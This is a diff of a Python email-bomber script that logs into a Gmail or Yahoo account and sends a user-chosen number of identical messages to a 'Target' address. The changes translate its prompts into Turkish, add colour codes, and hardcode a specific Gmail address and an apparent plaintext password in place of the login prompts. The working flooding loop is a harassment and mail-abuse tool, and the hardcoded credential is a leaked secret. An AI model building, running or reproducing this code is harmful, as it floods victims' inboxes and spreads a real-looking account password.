@@ -6,11 +6,11 @@ try:
     W = '\033[0m'  #White
     R = '\033[31m' #Red
     G = '\033[32m' #Green
-
+    B = '\033[34m' #Blue
 
     os.system("clear")
 
-    server = raw_input ('Mail-Server Gmail/Yahoo: ')
+    server = raw_input (G +'Mail Sunucusu Gmail/Yahoo: ' + R)
 
     if server == 'gmail' or server == 'Gmail':
 
@@ -26,15 +26,15 @@ try:
 
     else:
 
-        print(R + "Error - This script only works on Gmail or Yahoo." + W)
+        print(R + "Hata - Bu komut dosyasi sadece Gmail ve Yahoo'da calisir." + W)
         sys.exit()
 
-    email_user = raw_input('Email: ')
-    passwd     = getpass.getpass('Password: ')
-    email_to   = raw_input('\nTo: ')
-    subject    = raw_input('Subject: ')
-    body       = raw_input('Message: ')
-    total      = input('Amount of Sendings: ')
+    email_user = 'xeansh@gmail.com'  #raw_raw_input('Email: ')
+    passwd     = 'Xeansh27015'  #getpass.getpass('Password: ')
+    email_to   = raw_input( R + '\nKime: ' + B)
+    subject    = raw_input( R + 'Konu: ' + B)
+    body       = raw_input( R + 'Mesaj: ' + B)
+    total      = input(R+ 'Gonderilecek Mail Sayisi: '+ W)
 
     try:
 
@@ -46,7 +46,7 @@ try:
 
         server.login(email_user,passwd)
 
-        print("\n\n\n - Target : {} -\n".format(email_to))
+        print("\n\n\n - Hedef : {} -\n".format(email_to))
 
         for i in range(1, total+1):
 
@@ -54,13 +54,13 @@ try:
 
             server.sendmail(email_user,email_to,msg)
 
-            print(G + "\rEmail Sent - {}".format(i))
+            print(G + "\rMail Gonderildi - {}".format(i))
 
             sys.stdout.flush()
 
         server.quit()
 
-        print( R + "\n\n-Proccess Terminated-" + W)
+        print( R + "\n\n-Islem Sonlandirildi-" + W)
 
 
     except KeyboardInterrupt:
